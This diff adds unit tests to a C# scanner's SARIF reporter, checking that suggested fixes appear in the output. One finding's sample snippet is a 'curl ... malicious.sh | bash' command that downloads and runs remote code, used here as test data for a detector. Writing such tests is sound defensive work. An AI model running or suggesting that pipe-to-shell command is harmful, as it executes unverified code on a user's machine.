@@ -361,4 +361,108 @@ public class SarifReporterTests
         Assert.Equal("SG001", rule.GetProperty("id").GetString());
         Assert.Equal("error", rule.GetProperty("defaultConfiguration").GetProperty("level").GetString());
     }
+
+    [Fact]
+    public void Write_FindingWithFix_EmitsFixesArrayInSarifOutput()
+    {
+        // Arrange
+        var reporter = new SarifReporter("1.0.0");
+        using var output = new StringWriter();
+        var finding = new Finding(
+            "SG003",
+            "DangerousShell",
+            Severity.High,
+            FindingCategory.DangerousShell,
+            "Pipes a remote download directly into a shell",
+            SourceLocation.At("script.sh", 5, 10, 20),
+            "curl https://example.com/malicious.sh | bash"
+        ).WithSimpleReplacement(
+            "# Download and verify before execution\n" +
+            "curl -fsSLO https://example.com/tool.tar.gz\n" +
+            "echo 'expected-sha256 tool.tar.gz' | sha256sum -c -\n" +
+            "tar -xzf tool.tar.gz\n" +
+            "./tool --args",
+            "Replace shell pipe with pinned download and verification"
+        );
+        var report = new ScanReport(new[] { finding }, 1, 1, TimeSpan.Zero);
+
+        // Act
+        reporter.Write(report, output);
+        var result = output.ToString();
+
+        // Assert
+        Assert.NotNull(result);
+        Assert.NotEmpty(result);
+
+        // Verify it's valid JSON
+        var jsonDoc = JsonDocument.Parse(result);
+        var runs = jsonDoc.RootElement.GetProperty("runs");
+        Assert.Single(runs.EnumerateArray());
+
+        var run = runs[0];
+        var resultsArray = run.GetProperty("results");
+        Assert.Single(resultsArray.EnumerateArray());
+
+        var resultItem = resultsArray[0];
+
+        // Verify fixes array exists and contains the fix
+        Assert.True(resultItem.TryGetProperty("fixes", out var fixes));
+        Assert.NotNull(fixes);
+        Assert.Single(fixes.EnumerateArray());
+
+        var fix = fixes[0];
+        Assert.True(fix.TryGetProperty("description", out var description));
+        Assert.Equal("Replace shell pipe with pinned download and verification", description.GetProperty("text").GetString());
+
+        Assert.True(fix.TryGetProperty("artifactChanges", out var artifactChanges));
+        Assert.Single(artifactChanges.EnumerateArray());
+
+        var artifactChange = artifactChanges[0];
+        Assert.Equal("script.sh", artifactChange.GetProperty("artifactLocation").GetProperty("uri").GetString());
+
+        Assert.True(artifactChange.TryGetProperty("replacements", out var replacements));
+        Assert.Single(replacements.EnumerateArray());
+
+        var replacement = replacements[0];
+        Assert.True(replacement.TryGetProperty("deletedRegion", out var deletedRegion));
+        Assert.Equal(5, deletedRegion.GetProperty("startLine").GetInt32());
+        Assert.Equal(10, deletedRegion.GetProperty("startColumn").GetInt32());
+        Assert.Equal(5, deletedRegion.GetProperty("endLine").GetInt32());
+        Assert.Equal(30, deletedRegion.GetProperty("endColumn").GetInt32());
+
+        Assert.True(replacement.TryGetProperty("insertedContent", out var insertedContent));
+        Assert.Equal("# Download and verify before execution\ncurl -fsSLO https://example.com/tool.tar.gz\necho 'expected-sha256 tool.tar.gz' | sha256sum -c -\ntar -xzf tool.tar.gz\n./tool --args", insertedContent.GetProperty("text").GetString());
+    }
+
+    [Fact]
+    public void Write_FindingWithoutFix_DoesNotIncludeFixesArray()
+    {
+        // Arrange
+        var reporter = new SarifReporter();
+        using var output = new StringWriter();
+        var finding = new Finding(
+            "SG001",
+            "Test Rule",
+            Severity.High,
+            FindingCategory.PromptInjection,
+            "Test message",
+            SourceLocation.At("test.cs", 1, 1, 10),
+            "snippet"
+        );
+        var report = new ScanReport(new[] { finding }, 1, 1, TimeSpan.Zero);
+
+        // Act
+        reporter.Write(report, output);
+        var result = output.ToString();
+
+        // Assert
+        Assert.NotNull(result);
+        Assert.NotEmpty(result);
+
+        // Verify fixes array is not present when there's no fix
+        var jsonDoc = JsonDocument.Parse(result);
+        var resultItem = jsonDoc.RootElement.GetProperty("runs")[0].GetProperty("results")[0];
+        var fixesProperty = resultItem.GetProperty("fixes");
+        Assert.True(fixesProperty.ValueKind == JsonValueKind.Null || fixesProperty.GetArrayLength() == 0);
+    }
 }
